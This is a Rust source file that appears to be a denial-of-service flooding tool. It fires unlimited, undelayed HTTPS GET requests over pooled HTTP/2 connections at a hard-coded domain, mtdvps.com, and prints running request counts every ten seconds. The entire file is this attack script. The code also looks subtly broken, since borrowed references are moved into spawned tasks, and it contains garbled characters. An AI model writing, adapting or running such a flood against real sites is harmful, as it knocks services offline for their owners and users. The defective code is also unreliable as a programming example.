use hyper::{Client, Uri};
use hyper_tls::HttpsConnector;
use tokio::task;
use std::sync::atomic::{AtomicU64, Ordering};
use tokio::time::{interval, Duration};
use std::sync::Mutex;
use hyper::StatusCode;
// 29
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create an HTTPS connector with HTTP/2 and TLS
    let https = HttpsConnector::new();
    let client = Client::builder()
        .http2_only(true) // Force HTTP/2 for multiplexing
        .pool_max_idle_per_host(usize::MAX) // Max out connection pooling
        .build::<_, hyper::Body>(https);

    // Target URL
    let uri: Uri = "https://mtdvps.com".parse()?;

    // Atomic counter for total requests
    let total_requests = AtomicU64::new(0);
    // Mutex to store the latest status or error
    let last_status = Mutex::new(Ok(StatusCode::OK)); // Default to 200 OK

    println!("Starting unlimited GET requests to {} with updates every 10s", uri);

    // Spawn a separate task for periodic updates
    let total_requests_ref = &total_requests;
    let last_status_ref = &last_status;
    task::spawn(async move {
        let mut ticker = interval(Duration::from_secs(10));
        loop {
            ticker.tick().await;
            let total = total_requests_ref.load(Ordering::Relaxed);
            let status = last_status_ref.lock().unwrap();
            match *status {
                Ok(code) => println!("Total requests: {} - Status: {}", total, code),
                Err(ref e) => println!("Total requests: {} - Error: {}", total, e),
            }
        }
    });

    // Infinite loop for sending requests
    loop {
        let client = client.clone();
        let uri = uri.clone();
        let total_requests = &total_requests;
        let last_status = &last_status;

        // Spawn a task for each request
        task::spawn(async move {
            total_requests.fetch_add(1, Ordering::Relaxed);
            let result = client.get(uri).await.map(|resp| resp.status());
            let mut status = last_status.lock().unwrap();
            *status = result.map_err(|e| e.into());
        });

        // No delaysâ€”fire requests as fast as possible
    }
}
